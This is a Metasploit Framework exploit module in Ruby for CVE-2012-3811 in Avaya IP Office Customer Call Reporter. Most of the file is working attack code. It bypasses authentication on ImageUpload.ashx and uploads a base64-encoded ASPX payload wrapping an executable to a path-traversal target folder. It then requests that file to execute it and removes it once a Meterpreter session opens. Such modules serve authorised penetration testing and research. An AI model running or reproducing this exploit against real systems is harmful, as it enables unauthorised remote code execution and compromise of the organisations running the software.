##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##
require 'uri'
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::EXE
def initialize
super(
'Name' => 'Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution',
'Description' => %q{
This module exploits an authentication bypass vulnerability on Avaya IP Office
Customer Call Reporter, which allows a remote user to upload arbitrary files
through the ImageUpload.ashx component. It can be abused to upload and execute
arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP
Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.
},
'Author' =>
[
'rgod <rgod[at]autistici.org>', # Vulnerability discovery
'juan vazquez' # Metasploit module
],
'Platform' => 'win',
'References' =>
[
[ 'CVE', '2012-3811' ],
[ 'OSVDB', '83399' ],
[ 'BID', '54225' ],
[ 'URL', 'https://downloads.avaya.com/css/P8/documents/100164021' ],
[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-106/' ]
],
'Targets' =>
[
[ 'Avaya IP Office Customer Call Reporter 7.0 and 8.0 / Microsoft Windows Server 2003 SP2', { } ],
],
'DefaultTarget' => 0,
'Privileged' => false,
'DisclosureDate' => 'Jun 28 2012'
)
register_options(
[
OptString.new('TARGETURI', [true, 'The URI path of the Avaya CCR applications', '/'])
], self.class)
end
#
# Remove the .aspx if we get a meterpreter.
#
def on_new_session(cli)
if cli.type != 'meterpreter'
print_error("Meterpreter not used. Please manually remove #{@payload_path}")
return
end
cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
begin
cli.fs.file.rm(@payload_path)
print_good("#{@peer} - #{@payload_path} deleted")
rescue ::Exception => e
print_error("Unable to delete #{@payload_path}: #{e.message}")
end
end
def exploit
@peer = "#{rhost}:#{rport}"
# Generate the ASPX containing the EXE containing the payload
exe = generate_payload_exe
aspx = Msf::Util::EXE.to_exe_aspx(exe)
aspx_b64 = Rex::Text.encode_base64(aspx)
uri_path = target_uri.path
uri_path.path << "/" if uri_path[-1, 1] != "/"
boundary = "---------------------------#{rand_text_alpha(36)}"
my_data = "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_fileName\"\r\n"
my_data << "\r\n"
my_data << "#{rand_text_alpha(rand(5)+3)}.aspx\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_data\"\r\n"
my_data << "\r\n"
my_data << "#{aspx_b64}\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_targetFolder\"\r\n"
my_data << "\r\n"
my_data << "../../CCRWallboardMessageBroker/\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_position\"\r\n"
my_data << "\r\n"
my_data << "0\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_targetPhysicalFolder\"\r\n"
my_data << "\r\n"
my_data << "\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_overwriteExistingFiles\"\r\n"
my_data << "\r\n"
my_data << "True\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"RadUAG_finalFileRequest\"\r\n"
my_data << "\r\n"
my_data << "True\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"UploadImageType\"\r\n"
my_data << "\r\n"
my_data << "0\r\n"
my_data << "--#{boundary}\r\n"
my_data << "Content-Disposition: form-data; name=\"WallboardID\"\r\n"
my_data << "\r\n"
my_data << "0\r\n"
my_data << "--#{boundary}--\r\n"
#
# UPLOAD
#
attack_url = uri_path + "CCRWebClient/Wallboard/ImageUpload.ashx"
print_status("#{@peer} - Uploading #{aspx_b64.length} bytes through #{attack_url}...")
res = send_request_cgi({
'uri' => attack_url,
'method' => 'POST',
'ctype' => "multipart/form-data; boundary=#{boundary}",
'data' => my_data,
}, 20)
payload_url = ""
@payload_path = ""
if res and res.code == 200 and res.body =~ /"Key":"RadUAG_success","Value":true/
print_good("#{@peer} - Payload uploaded successfuly")
else
print_error("#{@peer} - Payload upload failed")
return
end
# Retrieve info about the uploaded payload
if res.body =~ /\{"Key":"RadUAG_filePath","Value":"(.*)"\},\{"Key":"RadUAG_associatedData/
@payload_path = $1
print_status("#{@peer} - Payload stored on #{@payload_path}")
else
print_error("#{@peer} - The payload file path couldn't be retrieved")
end
if res.body =~ /\[\{"Key":"UploadedImageURL","Value":"(.*)"\}\]/
payload_url = URI($1).path
else
print_error("#{@peer} - The payload URI couldn't be retrieved... Aborting!")
return
end
#
# EXECUTE
#
print_status("#{@peer} - Executing #{payload_url}...")
res = send_request_cgi({
'uri' => payload_url,
'method' => 'GET'
}, 20)
if (!res or (res and res.code != 200))
print_error("#{@peer} - Execution failed on #{payload_url} [No Response]")
return
end
end
end
